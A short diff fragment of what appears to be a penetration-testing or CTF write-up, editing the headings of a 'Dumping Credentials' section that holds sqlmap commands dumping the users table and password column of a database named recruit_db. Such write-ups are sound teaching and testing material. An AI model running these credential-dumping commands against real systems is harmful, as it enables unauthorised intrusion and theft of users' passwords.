@@ -387,7 +387,7 @@ Output:
 
 # Dumping Credentials
 
-Dump the contents:
+Dump users:
 
 ```bash
 sqlmap -r req -D recruit_db -T users --dump
@@ -403,6 +403,9 @@ Result:
 +----------+
 
 ```
+
+Dump password :
+
 ```bash
 sqlmap -r req -D recruit_db -T users -C password --dump
 ```
